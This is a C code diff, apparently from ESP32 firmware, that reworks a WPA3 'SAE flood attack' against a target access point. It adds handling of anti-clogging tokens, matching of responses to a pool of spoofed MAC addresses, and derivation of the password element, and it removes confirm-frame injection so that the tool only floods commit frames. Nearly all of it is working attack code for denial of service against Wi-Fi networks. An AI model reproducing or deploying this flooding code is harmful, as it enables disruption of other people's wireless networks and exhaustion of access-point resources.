+                }
+            }
+            sae_initialized = true;
+        }
+    }
 
     wifi_manager_start_monitor_mode(sae_monitor_callback);
     esp_wifi_set_channel(sae_target_channel, WIFI_SECOND_CHAN_NONE);
@@ -5191,6 +5450,26 @@ void wifi_manager_stop_sae_flood(void) {
     }
     
     wifi_manager_stop_monitor_mode();
+    if (sae_initialized) {
+        mbedtls_ecp_group_free(&sae_ctx.group);
+        mbedtls_ecp_point_free(&sae_ctx.pwe);
+        mbedtls_ecp_point_free(&sae_ctx.peer_element);
+        mbedtls_ecp_point_free(&sae_ctx.own_element);
+        mbedtls_mpi_free(&sae_ctx.peer_scalar);
+        mbedtls_mpi_free(&sae_ctx.own_scalar);
+        mbedtls_mpi_free(&sae_ctx.rand);
+        mbedtls_mpi_free(&sae_ctx.mask);
+        memset(&sae_ctx, 0, sizeof(sae_ctx));
+        sae_initialized = false;
+    }
+    if (sae_crypto_initialized) {
+        mbedtls_ecp_point_free(&sae_tmp_point);
+        mbedtls_ctr_drbg_free(&sae_ctr_drbg);
+        mbedtls_entropy_free(&sae_entropy);
+        sae_crypto_initialized = false;
+    }
+    memset(sae_commit_cache_ready, 0, sizeof(sae_commit_cache_ready));
+    sae_mac_pool_ready = false;
     printf("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
     TERMINAL_VIEW_ADD_TEXT("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
 }
@@ -5286,72 +5565,78 @@ static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
     
     if (auth_seq == 1) {  // SAE Commit response
         if (status_code == 76) {  // Anti-clogging token required
-            printf("Anti-clogging token required\n");
-            size_t avail = pkt->rx_ctrl.sig_len > 8 ? (size_t)pkt->rx_ctrl.sig_len - 8 : 0;
-            uint16_t tlen = (avail > 32) ? 32 : (uint16_t)avail;
+            ESP_LOGI("SAE_RX", "status 76 token required");
+            uint16_t group_id = auth_body[6] | (auth_body[7] << 8);
+            // payload length is total mgmt payload minus 24 byte MAC header
+            size_t payload_len = (pkt->rx_ctrl.sig_len > 24) ? (size_t)pkt->rx_ctrl.sig_len - 24 : 0;
+            // Authentication body starts at payload+24
+            const uint8_t *auth_payload = (const uint8_t*)ipkt; // ipkt->payload already points past header in struct
+            const uint8_t *ptr = auth_body + 8;
+            size_t remaining = (payload_len > 8) ? (payload_len - 8) : 0;
+            uint16_t tlen = 0;
+            if (group_id == 19 && remaining >= 2) {
+                // For our simplified format, treat everything after group as token up to our cap
+                tlen = (remaining > sizeof(sae_ctx.token)) ? sizeof(sae_ctx.token) : (uint16_t)remaining;
+            }
             portENTER_CRITICAL(&sae_lock);
-            sae_ctx.token_required = true;
+            sae_ctx.token_required = (tlen > 0);
             sae_ctx.token_len = tlen;
-            if (tlen) memcpy(sae_ctx.token, auth_body + 8, tlen);
+            if (tlen) memcpy(sae_ctx.token, ptr, tlen);
             portEXIT_CRITICAL(&sae_lock);
+            memcpy(sae_token_mac, hdr->addr1, 6);
+            sae_token_mac_valid = true;
+            sae_token_rx++;
+            sae_status76_rx++;
         } else if (status_code == 0) {  // Success - extract peer commit
-            printf("SAE Commit accepted, extracting peer data\n");
-            // Extract peer element and scalar from response
+            ESP_LOGI("SAE_RX", "status 0 commit accepted");
+            // Extract peer scalar and element from response
             uint16_t group_id = auth_body[6] | (auth_body[7] << 8);
             if (group_id == 19) {  // P-256
-                // Peer element (32 bytes) + scalar (32 bytes)
+                // Peer scalar (32 bytes) + element (32 bytes)
+                mbedtls_mpi_read_binary(&sae_ctx.peer_scalar, auth_body + 8, 32);
                 uint8_t peer_element_buf[33] = {0x02};  // Compressed format
-                memcpy(peer_element_buf + 1, auth_body + 8, 32);
+                memcpy(peer_element_buf + 1, auth_body + 40, 32);
                 mbedtls_ecp_point_read_binary(&sae_ctx.group, &sae_ctx.peer_element, 
                                               peer_element_buf, 33);
-                mbedtls_mpi_read_binary(&sae_ctx.peer_scalar, auth_body + 40, 32);
+                // Match scalar and element to the MAC AP responded to; set full tuple
+                if (sae_mac_pool_ready) {
+                    for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
+                        if (sae_commit_cache_ready[i] && memcmp(hdr->addr1, sae_mac_pool[i], 6) == 0) {
+                            portENTER_CRITICAL(&sae_lock);
+                            memcpy(sae_ctx.own_mac, sae_mac_pool[i], 6);
+                            memcpy(sae_ctx.peer_mac, sae_target_bssid, 6);
+                            memcpy(sae_ctx.bssid, sae_target_bssid, 6);
+                            mbedtls_mpi_read_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[i], 32);
+                            portEXIT_CRITICAL(&sae_lock);
+                            ESP_LOGI("SAE_RX", "matched pool idx=%d", i);
+                            break;
+                        }
+                    }
+                }
+
+                // Ensure PWE is derived for this MAC tuple for confirm/KCK
+                const char *pwd = settings_get_sta_password(&G_Settings);
+                const char *ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
+                if (pwd && strlen(pwd) > 0) {
+                    ESP_LOGI("SAE_RX", "derive pwe for confirm path");
+                    sae_derive_pwe(pwd, sae_ctx.own_mac, sae_target_bssid, ssid, &sae_ctx.pwe, &sae_ctx.group);
+                }
                 
-                // Now send confirm frame
-                inject_sae_confirm_frame();
+                // do not send confirm; continue flooding commits only
+                sae_status0_rx++;
+                // Clear token state after a successful exchange
+                portENTER_CRITICAL(&sae_lock);
+                sae_ctx.token_required = false;
+                sae_ctx.token_len = 0;
+                portEXIT_CRITICAL(&sae_lock);
+                sae_token_mac_valid = false;
             }
         }
     } else if (auth_seq == 2) {  // SAE Confirm response
-        printf("SAE Confirm received, status: %d\n", status_code);
-        if (status_code == 0) {
-            printf("SAE authentication successful!\n");
-        }
+        ESP_LOGI("SAE_RX", "confirm status=%u", (unsigned)status_code);
     }
 }
 /**
  * Inject SAE confirm frame after successful commit exchange
  */
-static void inject_sae_confirm_frame(void) {
-    uint8_t frame[100];
-    int frame_len = 0;
-    uint8_t own_mac[6];
-    esp_wifi_get_mac(WIFI_IF_STA, own_mac);
-    
-    // 802.11 Authentication header
-    frame[0] = 0xb0; frame[1] = 0x00;  // Frame Control
-    frame[2] = 0x00; frame[3] = 0x00;  // Duration
-    memcpy(frame + 4, sae_target_bssid, 6);   // DA
-    memcpy(frame + 10, own_mac, 6);           // SA
-    memcpy(frame + 16, sae_target_bssid, 6);  // BSSID
-    uint16_t seq = esp_random() & 0xFFF0;
-    frame[22] = seq & 0xFF; frame[23] = seq >> 8;
-    frame_len = 24;
-    
-    // Auth Algorithm = SAE (3), Sequence = Confirm (2), Status = 0
-    frame[frame_len++] = 0x03; frame[frame_len++] = 0x00;  // Algorithm
-    frame[frame_len++] = 0x02; frame[frame_len++] = 0x00;  // Transaction (Confirm)
-    frame[frame_len++] = 0x00; frame[frame_len++] = 0x00;  // Status
-    
-    // Send-Confirm field (2 bytes)
-    frame[frame_len++] = 0x01; frame[frame_len++] = 0x00;  // Send-Confirm = 1
-    
-    // Calculate and add confirm value (32 bytes)
-    uint8_t confirm_value[32];
-    if (sae_calculate_confirm(&sae_ctx, 1, confirm_value) == ESP_OK) {
-        memcpy(frame + frame_len, confirm_value, 32);
-        frame_len += 32;
-    }
-    
-    // Transmit confirm frame
-    esp_wifi_80211_tx(WIFI_IF_STA, frame, frame_len, false);
-    printf("SAE Confirm frame sent\n");
-}
+// confirm injection removed – flood commits only
